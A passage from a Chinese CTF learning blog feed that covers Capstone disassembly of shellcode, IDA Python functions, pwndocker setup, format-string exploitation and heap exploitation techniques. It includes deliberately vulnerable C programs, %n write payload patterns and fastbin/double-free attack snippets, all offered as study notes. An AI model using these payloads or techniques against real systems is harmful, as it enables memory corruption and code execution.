class="comment">#获取偏移量，即0x10</span></span><br></pre></td></tr></table></figure><p>对应的输出：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">$ python example2.py</span><br><span class="line">0x1000: mov     eax, dword ptr [rdi + 0x9876]</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=rdi</span><br><span class="line">                IMM=0x9876</span><br><span class="line">0x1006: jmp     0x1013</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1013</span><br><span class="line">0x1008: pop     rbx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=rbx</span><br><span class="line">0x1009: xor     eax, eax</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=eax</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=eax</span><br><span class="line">0x100b: xor     ecx, ecx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=ecx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=ecx</span><br><span class="line">0x100d: xor     edx, edx</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=edx</span><br><span class="line">        operands[2]:</span><br><span class="line">                REG=edx</span><br><span class="line">0x100f: mov     al, 0xb</span><br><span class="line">        operands[1]:</span><br><span class="line">                REG=al</span><br><span class="line">        operands[2]:</span><br><span class="line">                IMM=0xb</span><br><span class="line">0x1011: int     0x80</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x80</span><br><span class="line">0x1013: call    0x1008</span><br><span class="line">        operands[1]:</span><br><span class="line">                IMM=0x1008</span><br></pre></td></tr></table></figure><p>呃。。。大概就先这样吧，后面有遇到需要再补充</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;复现网鼎的题目的时候看到大佬用了Capstone，结果看不懂。。。。就顺便学习下。。&lt;/p&gt;
&lt;h1 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>跟着Lantern学逆向之IDA python</title>
    <link href="https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/"/>
    <id>https://nuoye-blog.github.io/2020/05/18/RE/%E8%B7%9F%E7%9D%80Lantern%E5%AD%A6RE%E4%B9%8BIDA%20python/</id>
    <published>2020-05-18T08:42:00.000Z</published>
    <updated>2020-05-18T08:41:45.682Z</updated>
    
    <content type="html"><![CDATA[<p>跟着<a href="https://lantern.cool/2020/05/05/ida-python/" target="_blank" rel="noopener">Lantern</a>学逆向之IDA python:</p><h1 id="函数表"><a href="#函数表" class="headerlink" title="函数表"></a>函数表</h1><p>首先是介绍一些函数：</p><table><thead><tr><th>函数名</th><th>作用</th></tr></thead><tbody><tr><td>ScreenEA()</td><td>获取 IDA 调试窗口中，光标指向代码的地址。</td></tr><tr><td>GetInputFileMD5()</td><td>返回 IDA 加载的二进制文件的 MD5 值。</td></tr><tr><td>FirstSeg()</td><td>访问程序中的第一个段。</td></tr><tr><td>NextSeg()</td><td>访问下一个段，如果没有就返回 BADADDR。</td></tr><tr><td>SegByName( string SegmentName )</td><td>通过段名字返回段基址，举个例子，如果调用.text 作为参数，就会返回程序中代码段的开始位置。</td></tr><tr><td>SegEnd( long Address )</td><td>通过段内的某个地址，获得段尾的地址。</td></tr><tr><td>SegStart( long Address )</td><td>通过段内的某个地址，获得段头的地址。</td></tr><tr><td>SegName( long Address )</td><td>通过段内的某个地址，获得段名。</td></tr><tr><td>Segments()</td><td>返回目标程序中的所有段的开始地址。</td></tr><tr><td>Functions( long StartAddress, long EndAddress )</td><td>返回一个列表，包含了从 StartAddress 到 EndAddress 之间的所有函数。</td></tr><tr><td>Chunks( long FunctionAddress )</td><td>返回一个列表，包含了函数片段。每个列表项都是一个元组（chunk start, chunk end）</td></tr><tr><td>LocByName( string FunctionName )</td><td>通过函数名返回函数的地址。</td></tr><tr><td>GetFuncOffset( long Address )</td><td>通过任意一个地址，然后得到这个地址所属的函数名，以及给定地址和函数的相对位移。 然后把这些信息组成字符串以”名字+位移”的形式返回。</td></tr><tr><td>GetFunctionName( long Address )</td><td>通过一个地址，返回这个地址所属的函数。</td></tr><tr><td>CodeRefsTo( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 处代码被什么地方引用了，Flow 告诉 IDAPython 是否要 跟踪这些代码。</td></tr><tr><td>CodeRefsFrom( long Address, bool Flow )</td><td>返回一个列表，告诉我们 Address 地址上的代码引用何处的代码。</td></tr><tr><td>DataRefsTo( long Address )</td><td>返回一个列表，告诉我们 Address 处数据被什么地方引用了。常用于跟踪全局变量。</td></tr><tr><td>DataRefsFrom( long Address )</td><td>返回一个列表，告诉我们 Address 地址上的代码引用何处的数据。</td></tr><tr><td>Heads(start=None, end=None)</td><td>得到两个地址之间所有的元素</td></tr><tr><td>GetDisasm(addr)</td><td>得到addr的反汇编语句</td></tr><tr><td>GetMnem(addr)</td><td>得到addr地址的操作码</td></tr><tr><td>BADADDR</td><td>验证是不是错误地址</td></tr><tr><td>GetOpnd(addr，long n)</td><td>第一个参数是地址，第二个long n是操作数索引。第一个操作数是0和第二个是1。</td></tr><tr><td>idaapi.decode_insn(ea)</td><td>得到当前地址指令的长度</td></tr><tr><td>idc.FindFuncEnd(ea)</td><td>找到当前地址的函数结束地址</td></tr><tr><td>Entries()</td><td>入口点信息</td></tr><tr><td>Structs()</td><td>遍历结构体</td></tr><tr><td>StructMembers(sid)</td><td>遍历结构体成员</td></tr><tr><td>DecodePrecedingInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodePreviousInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>DecodeInstruction(ea)</td><td>获取指令结构</td></tr><tr><td>Strings(object)</td><td>获取字符串</td></tr><tr><td>GetIdbDir()</td><td>获取idb目录</td></tr><tr><td>GetRegisterList()</td><td>获取寄存器名表</td></tr><tr><td>GetInstructionList</td><td>获取汇编指令表</td></tr><tr><td>atoa(ea)</td><td>获取所在段</td></tr><tr><td>Jump(ea)</td><td>移动光标</td></tr><tr><td>Eval(expr)</td><td>计算表达式</td></tr><tr><td>Exec(command)</td><td>执行命令行</td></tr><tr><td>MakeCode(ea)</td><td>分析代码区</td></tr><tr><td>MakeNameEx(ea, name, flags)</td><td>重命名地址</td></tr><tr><td>MakeArray(ea, nitems)</td><td>创建数组</td></tr><tr><td>MakeStr(ea, endea)</td><td>创建字符串</td></tr><tr><td>MakeData(ea, flags, size, tid)</td><td>创建数据</td></tr><tr><td>MakeByte(ea)</td><td></td></tr><tr><td>MakeWord(ea)</td><td></td></tr><tr><td>MakeDWord(ea)</td><td></td></tr><tr><td>MakeQWord(ea)</td><td></td></tr><tr><td>MakeOWord(ea)</td><td></td></tr><tr><td>MakeYWord(ea)</td><td></td></tr><tr><td>MakeFlot(ea)</td><td></td></tr><tr><td>MakeDouble(ea)</td><td></td></tr><tr><td>MakePackReal(ea)</td><td></td></tr><tr><td>MakeTbyte(ea)</td><td></td></tr><tr><td>MakeStructEx(ea)</td><td></td></tr><tr><td>MakeCustomDataEx(ea)</td><td></td></tr><tr><td>PatchByte(ea, value)</td><td>修改程序字节</td></tr><tr><td>PatchWord(ea, value)</td><td>修改程序字</td></tr><tr><td>PatchDword(ea, value)</td><td>修改程序双字</td></tr><tr><td>Byte(ea)</td><td>将地址解释为Byte</td></tr><tr><td>Word(ea)</td><td></td></tr><tr><td>DWord(ea)</td><td></td></tr><tr><td>QWord(ea)</td><td></td></tr><tr><td>GetFloat(ea)</td><td>获取浮点数</td></tr><tr><td>GetDouble(ea)</td><td>获取双精度浮点数</td></tr><tr><td>GetString(ea, length = -1, strtype = ASCSTR_C)</td><td>获取字符串</td></tr><tr><td>GetCurrentLine()</td><td>获取光标所在行反汇编</td></tr><tr><td>ItemSize(ea)</td><td>获取指令或数据长度</td></tr><tr><td>FindText(ea, flag, y, x, searchstr)</td><td>查找文本</td></tr><tr><td>FindBinary(ea, flag, searchstr, radix=16)</td><td>查找16进制</td></tr><tr><td>GetEntryPointQty()</td><td>获取入口点个数</td></tr><tr><td>GetEntryOrdinal(index)</td><td>获取入口点地址</td></tr><tr><td>GetEntryName(ordinal)</td><td>获得入口名</td></tr></tbody></table><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h3 id="xman2019-trydbg-exe"><a href="#xman2019-trydbg-exe" class="headerlink" title="xman2019-trydbg.exe"></a>xman2019-trydbg.exe</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">addr = find_binary(<span class="number">0x140001050</span>, <span class="number">1</span>, <span class="string">'74 12 75 10 4C 7F 53 0C 0C 54 8F C4 28 E9 42 FE FF FF 80 75'</span>)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">     ea - address to start from</span></span><br><span class="line"><span class="string">     str - a string as a user enters it for Search Text in Core</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">if</span> addr == BADADDR:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">PatchByte(addr+i, <span class="number">0x90</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;跟着&lt;a href=&quot;https://lantern.cool/2020/05/05/ida-python/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Lantern&lt;/a&gt;学逆向之IDA python:&lt;/p&gt;
&lt;h1 id=&quot;函数表&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="RE" scheme="https://nuoye-blog.github.io/categories/RE/"/>
    
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="RE" scheme="https://nuoye-blog.github.io/tags/RE/"/>
    
      <category term="python" scheme="https://nuoye-blog.github.io/tags/python/"/>
    
      <category term="ida" scheme="https://nuoye-blog.github.io/tags/ida/"/>
    
  </entry>
  
  <entry>
    <title>pwndocker篇</title>
    <link href="https://nuoye-blog.github.io/2020/05/16/tool/Pwndocker%E7%AF%87/"/>
    <id>https://nuoye-blog.github.io/2020/05/16/tool/Pwndocker%E7%AF%87/</id>
    <published>2020-05-16T14:32:00.000Z</published>
    <updated>2020-05-18T08:42:24.923Z</updated>
    
    <content type="html"><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh</span><br><span class="line">$ sudo usermod -aG docker username</span><br></pre></td></tr></table></figure><h2 id="pwndocker安装"><a href="#pwndocker安装" class="headerlink" title="pwndocker安装"></a>pwndocker安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure><h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ pip2 install -i https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple pwntools</span></span><br></pre></td></tr></table></figure><p>后面gdb.attach()有点问题，还是先用python3吧</p><h1 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h1><h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker commit docker_id mydocker</span><br></pre></td></tr></table></figure><h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rmi -f mydocker</span><br></pre></td></tr></table></figure><h1 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h1><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d --privileged skysider/pwndocker</span><br></pre></td></tr></table></figure><p>即可后台运行（–privileged表示特权级运行，不加gdb会没有权限）</p><p>第二次直接查看id后运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">$ docker start docker_id</span><br></pre></td></tr></table></figure><h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it docker_id /bin/sh</span><br></pre></td></tr></table></figure><p>即可进入docker的shell</p><h2 id="停止docker"><a href="#停止docker" class="headerlink" title="停止docker"></a>停止docker</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stop docker_id</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker rm docker_id</span><br></pre></td></tr></table></figure><h1 id="指定libc"><a href="#指定libc" class="headerlink" title="指定libc"></a>指定libc</h1><p>首先写个shell脚本实现自动化</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">id=***</span><br><span class="line">docker cp ./1.py <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker cp ./elf <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/1.py</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/ld-2.29.so /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/libc.so.6 /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.29.so /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> tmux</span><br></pre></td></tr></table></figure><p>具体功能就是将elf和python文件cp到docker上，然后给予权限，再将libc和ld（这里用2.29版本）移到/tmp下，再用patchelf –set-interpreter修改elf的ld文件，然后进入tmux。这里还需要在手动运行python脚本（这里不会自动化，希望有大佬能帮忙下）。</p><p>然后就是python脚本中指定libc执行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"/tmp/elf"</span>, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/tmp/libc.so.6"</span>&#125;)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;h2 id=&quot;docker安装&quot;&gt;&lt;a href=&quot;#docker安装&quot; class=&quot;headerlink&quot; title=&quot;docker安装&quot;
      
    
    </summary>
    
    
      <category term="tool" scheme="https://nuoye-blog.github.io/categories/tool/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="docker" scheme="https://nuoye-blog.github.io/tags/docker/"/>
    
      <category term="tool" scheme="https://nuoye-blog.github.io/tags/tool/"/>
    
      <category term="glibc" scheme="https://nuoye-blog.github.io/tags/glibc/"/>
    
  </entry>
  
  <entry>
    <title>格式化字符串</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-18T08:42:13.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</p><ol><li>%08x.%08x                            以8位16进制方式输出print函数第一、二个参数</li><li>%p.%p                                与第一个等价</li><li>%3$x                                以8位16进制方式输出print函数第三个参数</li><li>addr%4$x                            以8位16进制方式输出addr对应函数的第四个参数</li><li>[padding][addr]%4$x                        同上，[padding]为填充字符</li></ol><h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>…[overwrite addr]….%[overwrite offset]$n                … 表示填充内容，overwrite addr 表示覆盖的地址，overwrite offset 地址表示覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数（$n为0-0xffffffff,$hn为0-0xffff,$hhn为0-0xff）</li><li>[addr of c]%012d%6$n                            覆盖从c为0x10(填充入字符串长度)，%012补充长度至0x10</li><li>a%8$naaa[addr of a]                            覆盖a变量为1，最大可为4(a为填充字符，使地址对齐)</li><li>%016c%8$naaa[addr of a]                            覆盖a变量为0x10</li><li>p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3) + ‘%104c%6$hn’ + ‘%070c%7$hn’+ ‘%036c%8$hn’+ ‘%002c’%9$hn’                覆盖b变量为0xe4e2be78（0xbe=16+104+70,0xe2=16+104+70+36,以此类推，超出256则减去256）</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;泄露内存&quot;&gt;&lt;a href=&quot;#泄露内存&quot; class=&quot;headerlink&quot; title=&quot;泄露内存&quot;&gt;&lt;/a&gt;泄露内存&lt;/h1&gt;&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;s
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nuoye-blog.github.io/tags/pwn/"/>
    
      <category term="ctf" scheme="https://nuoye-blog.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>pwn中各种利用技巧2</title>
    <link href="https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A72/"/>
    <id>https://nuoye-blog.github.io/2020/05/09/pwn/pwn%E4%B8%AD%E5%90%84%E7%A7%8D%E5%88%A9%E7%94%A8%E6%8A%80%E5%B7%A72/</id>
    <published>2020-05-08T16:00:00.000Z</published>
    <updated>2020-05-08T17:24:54.198Z</updated>
    
    <content type="html"><![CDATA[<h1 id="栈"><a href="#栈" class="headerlink" title="栈"></a>栈</h1><h2 id="stack-pivoting"><a href="#stack-pivoting" class="headerlink" title="stack pivoting"></a>stack pivoting</h2><p>把ret指针修改为jmp esp的地址，其后加上asm(sub esp,20,;jmp esp)，来跳转到shellcode处（ps：20表示偏移量20，需修改）</p><h2 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h2><p>利用leave劫持ebp，从而使得ret到ebp+8</p><h1 id="基于堆类型"><a href="#基于堆类型" class="headerlink" title="基于堆类型"></a>基于堆类型</h1><h2 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h2><p>FIFO：先进先出</p><p>free后，fd和bk为main_arena加上一定偏移的地址，可用于泄漏libc地址。</p><h2 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h2><p>FILO：先进后出</p><p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p><h2 id="Tcache"><a href="#Tcache" class="headerlink" title="Tcache"></a>Tcache</h2><p>FILO：先进后出</p><p>free时每类大小的bin中可存放7个tcache，其fd指向下一个tcache。</p><p>malloc时如果从fastbin中申请一个块，则剩下的块存入tcache中至满。</p><p>连续两次free相同大小后，最后一个free的fd指向前一个free的地址，可通过修改该值后用于申请任意地址。</p><h2 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h2><p>为双向链表，构造时需要同时修改fd与bk</p><h1 id="基于堆的攻击方法"><a href="#基于堆的攻击方法" class="headerlink" title="基于堆的攻击方法"></a>基于堆的攻击方法</h1><h2 id="Overflow-directly"><a href="#Overflow-directly" class="headerlink" title="Overflow directly"></a>Overflow directly</h2><p>直接溢出，最容易利用，需要构造好块</p><h2 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h2><p>free后未把指针置NULL，可重复使用该指针</p><h2 id="Double-Free"><a href="#Double-Free" class="headerlink" title="Double Free"></a>Double Free</h2><p>通常与UAF一起出现</p><p>常见套路:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这时申请到的块依次为1-&gt;2-&gt;1，fastbin可通过此任意申请地址</p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>原理：修改fd指针伪造fastbin链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">8</span>,p64(ptr))<span class="comment">#UAF</span></span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">new(<span class="number">3</span>,<span class="number">0x60</span>)</span><br></pre></td></tr></table></figure><p>此时3的地址为ptr+0x10，注意，ptr+8处的值应对应申请的fastbin大小。</p><h2 id="global-max-fast"><a href="#global-max-fast" class="headerlink" title="global_max_fast"></a>global_max_fast</h2><p>2.23版本位于0x3c67f8处</p><p>修改后可将fastbin范围扩大，更容易使用fastbin相关攻击。</p><h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin dup consolidate"></a>fastbin dup consolidate</h2><p>通过申请largebin触发malloc_consolidate，即可将原本free的fastbin放入unsortbin中，然后再次free。</p><p>利用方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">new(<span class="number">0</span>,<span class="number">0x40</span>)</span><br><span class="line">new(<span class="number">1</span>,<span class="number">0x40</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">new(<span class="number">2</span>,<span class="number">0x400</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>此时fastbin和unsortbin中都有0对应的地址。</p><h2 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large bin attack"></a>large bin attack</h2><p>与fastbin类似，但需要bk。（双向链表）</p><h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted bin attack"></a>unsorted bin 